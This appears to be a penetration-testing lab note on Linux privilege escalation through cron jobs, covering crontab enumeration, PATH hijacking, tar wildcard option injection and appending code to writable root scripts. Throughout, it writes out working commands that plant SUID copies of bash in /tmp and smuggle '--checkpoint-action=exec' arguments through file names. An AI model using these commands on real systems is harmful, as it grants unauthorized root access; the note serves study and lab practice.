#### Cron Jobs

The first five fields at the beginning of the cron job entry are used to specify the scheduled time. These fields are used to specify the following values:

Minute (0 – 59): Used to specify the minute the cron job should be run.
Hour (0 – 23): Used to specify the hour of the day the cron job should be run.
Day of the month (1 – 31): Used to specify the specific day of the month the cron job should be run.
Month (1 – 12): Used to specify the month when the cron job should be run.
Day of the week (0 – 7): Used to specify the day of the week when the cron job should be run.

```bash - kali
ls -lah /etc/cron*
```

Find and cat out **any** files.

```bash - kali
grep "CRON" /var/log/cron.log
```

```bash - kali
cat /etc/crontab 
```

Look at ==WHO IS RUNNING== the task, not who owns it!

![[1._Reverse Shells (LIN)#Python file root execute]]

Also check:
```bash - kali
systemctl list-timers --all
```


#### Path Environment Variable

The crontab PATH environment variable is by default set to /usr/bin:/bin

The PATH variable can be overwritten in the crontab file.

If a cron job program/script does not use an absolute path, and one of the PATH directories is writable by our user, we may be able to create a program/script with the same name as the cron job.

1. View the contents of the system-wide crontab:

```bash - kali
cat /etc/crontab
```

>PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
```* * * * * root overwrite.sh```
```* * * * * root /usr/local/bin/compress.sh```

Note that the /home/user directory (which we can write to) is at the start of the PATH variable, and the first cron job does not use an absolute path.

2. Create the file overwrite.sh in /home/user with the following contents:

==overwrite.sh==

---
```bash
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
```
---

3. Ensure that overwrite.sh is executable:

```bash
chmod +x /home/user/overwrite.sh
```

4. Wait for the cronjob to run (this job in particular runs every minute).

Once the /tmp/rootbash file is created, execute it (with -p to preserve the effective UID) to gain a root shell:

```bash
/tmp/rootbash –p
```

```bash
id
```

uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root)

#### File nonexistant
Notice the path that is listed, how it starts with /home/user.  Let's check there to see if the file "overwrite.sh" exists:

```bash - kali
ls -lah /home/user
```

It does not, so we can create the file to give us root.

```bash - kali
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
```

```bash - kali
chmod +x /home/user/overwrite.sh
```

The cron job runs every minute, so just wait until we see bash in /tmp directory, then run:

```bash - kali
/tmp/bash -p
```

#### Wildcards
```bash - kali
cat /etc/crontab 
```

In this example, we look at /usr/local/bin/compress.sh

```bash - kali
cat /usr/local/bin/compress.sh
```

We can take advantage of the wildcard character as seen above.  We'll create a malicious file called "runme.sh"

```bash - kali
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > runme.sh
```

```bash - kali
chmod +x runme.sh
```

```bash - kali
touch /home/user/--checkpoint=1
```

```bash - kali
touch /home/user/--checkpoint-action=exec=sh\runme.sh
```

```bash - kali
/tmp/bash -p
```

#### Append malicious code

We run ``'locate overwrite.sh'`` to find the location of the file, or, using the PATH, we begin hunting down the overwrite.sh file.  First we look in /home/user, not there, then /usr/local/sbin, not there, then finally we find it in /usr/local/bin.

```bash - kali
ls -lah /usr/local/bin/overwrite.sh
```

We see we do have write privileges to the file.  Let's take a peek at what the file does.

```bash - kali
cat /usr/local/bin/overwrite.sh
```

Now, we will append on our malicious code the file:

```bash - kali
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
```

```bash - kali
/tmp/bash -p
```
